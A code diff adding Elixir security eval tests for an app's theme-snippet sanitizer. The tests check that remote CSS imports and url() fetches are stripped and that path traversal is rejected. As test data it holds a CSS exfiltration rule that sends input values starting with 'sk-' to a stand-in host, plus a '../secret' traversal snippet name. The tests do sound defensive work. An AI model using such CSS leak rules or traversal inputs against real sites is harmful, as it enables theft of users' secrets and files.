@@ -10,6 +10,7 @@ defmodule AllbertAssist.Security.SurfaceWorkspaceEvalTest do
   alias AllbertAssist.Surface
   alias AllbertAssist.Surface.Encoder
   alias AllbertAssist.Surface.Node
+  alias AllbertAssist.Theme.Snippets
   alias AllbertAssist.Workspace
   alias AllbertAssist.Workspace.Catalog, as: WorkspaceCatalog
   alias AllbertAssist.Workspace.Ephemeral
@@ -584,6 +585,174 @@ defmodule AllbertAssist.Security.SurfaceWorkspaceEvalTest do
 
     assert {:ok, value} = eval.result.setting
     refute value == "verbose"
+  end
+
+  test "theme-snippet-import-reject-001: snippet imports are removed before serving" do
+    fixture = EvalInventory.row!("theme-snippet-import-reject-001")
+
+    eval =
+      run_eval(
+        Map.merge(fixture, %{
+          run: fn fixture ->
+            sanitized =
+              Snippets.sanitize("""
+              @import "https://example.invalid/theme.css";
+              #workspace-shell { color: #111827; }
+              """)
+
+            %{
+              decision:
+                if(String.contains?(sanitized.css, ["@import", "https://example.invalid"]),
+                  do: :allowed,
+                  else: :denied
+                ),
+              result: sanitized,
+              trace: %{
+                fixture_id: fixture.id,
+                boundary: :theme_snippet_sanitizer,
+                remote_import_removed?: not String.contains?(sanitized.css, "@import")
+              }
+            }
+          end
+        })
+      )
+
+    assert_denied(eval, no_side_effect?: true)
+    assert eval.result.css =~ "#workspace-shell"
+    refute eval.result.css =~ "@import"
+    refute eval.result.css =~ "https://example.invalid"
+    assert Enum.any?(eval.result.diagnostics, &(&1 =~ "@import"))
+  end
+
+  test "theme-snippet-url-strip-001: remote CSS fetch values are removed" do
+    fixture = EvalInventory.row!("theme-snippet-url-strip-001")
+
+    eval =
+      run_eval(
+        Map.merge(fixture, %{
+          run: fn fixture ->
+            sanitized =
+              Snippets.sanitize("""
+              #workspace-shell {
+                background-image: image-set(url("https://example.invalid/a.png") 1x);
+                border-color: #314457;
+              }
+              """)
+
+            remote_fetch? =
+              String.contains?(sanitized.css, [
+                "url(",
+                "image-set(",
+                "https://example.invalid"
+              ])
+
+            %{
+              decision: if(remote_fetch?, do: :allowed, else: :denied),
+              result: sanitized,
+              trace: %{
+                fixture_id: fixture.id,
+                boundary: :theme_snippet_sanitizer,
+                remote_fetch_removed?: not remote_fetch?
+              }
+            }
+          end
+        })
+      )
+
+    assert_denied(eval, no_side_effect?: true)
+    assert eval.result.css =~ "border-color: #314457"
+    refute eval.result.css =~ "url("
+    refute eval.result.css =~ "image-set("
+    refute eval.result.css =~ "https://example.invalid"
+    assert Enum.any?(eval.result.diagnostics, &(&1 =~ "url()"))
+    assert Enum.any?(eval.result.diagnostics, &(&1 =~ "image-set()"))
+  end
+
+  test "theme-css-exfil-001: enabled snippets cannot emit remote exfiltration URLs" do
+    fixture = EvalInventory.row!("theme-css-exfil-001")
+    Paths.ensure_home!()
+
+    File.write!(
+      Path.join([Paths.theme_snippets_root(), "exfil.css"]),
+      """
+      #workspace-shell input[value^="sk-"] {
+        background-image: url("https://example.invalid/leak");
+      }
+      #workspace-shell .workspace-chat-pane { outline-color: #314457; }
+      """
+    )
+
+    assert {:ok, _setting} =
+             Settings.put("workspace.theme.snippets_enabled", true, %{audit?: false})
+
+    assert {:ok, _setting} =
+             Settings.put("workspace.theme.enabled_snippets", ["exfil"], %{audit?: false})
+
+    eval =
+      run_eval(
+        Map.merge(fixture, %{
+          run: fn fixture ->
+            selected = Snippets.selected()
+            remote_fetch? = String.contains?(selected.css, ["url(", "https://example.invalid"])
+
+            %{
+              decision: if(remote_fetch?, do: :allowed, else: :denied),
+              result: selected,
+              trace: %{
+                fixture_id: fixture.id,
+                boundary: :theme_snippet_route,
+                remote_fetch_removed?: not remote_fetch?
+              }
+            }
+          end
+        })
+      )
+
+    assert_denied(eval, no_side_effect?: true)
+    assert eval.result.css =~ "outline-color: #314457"
+    refute eval.result.css =~ "url("
+    refute eval.result.css =~ "https://example.invalid"
+    assert [%{basename: "exfil.css", status: :sanitized}] = eval.result.items
+  end
+
+  test "theme-path-traversal-001: snippet names cannot escape the snippets root" do
+    fixture = EvalInventory.row!("theme-path-traversal-001")
+    Paths.ensure_home!()
+
+    outside_path = Path.join(Paths.home(), "secret.css")
+    File.write!(outside_path, "#workspace-shell { color: red; }\n")
+
+    assert {:ok, _setting} =
+             Settings.put("workspace.theme.snippets_enabled", true, %{audit?: false})
+
+    assert {:ok, _setting} =
+             Settings.put("workspace.theme.enabled_snippets", ["../secret"], %{audit?: false})
+
+    eval =
+      run_eval(
+        Map.merge(fixture, %{
+          run: fn fixture ->
+            selected = Snippets.selected()
+
+            %{
+              decision: if(selected.css == "", do: :denied, else: :allowed),
+              result: selected,
+              trace: %{
+                fixture_id: fixture.id,
+                boundary: :theme_snippet_path_scope,
+                attempted_path: "../secret",
+                outside_file_read?: selected.css =~ "color: red"
+              }
+            }
+          end
+        })
+      )
+
+    assert_denied(eval, no_side_effect?: true)
+    assert eval.result.css == ""
+    assert [%{status: :invalid_selection}] = eval.result.items
+    assert Enum.any?(eval.result.diagnostics, &(&1 =~ "unsafe snippet name"))
+    refute eval.trace.outside_file_read?
   end
 
   defp fragment_attrs(attrs \\ %{}) do
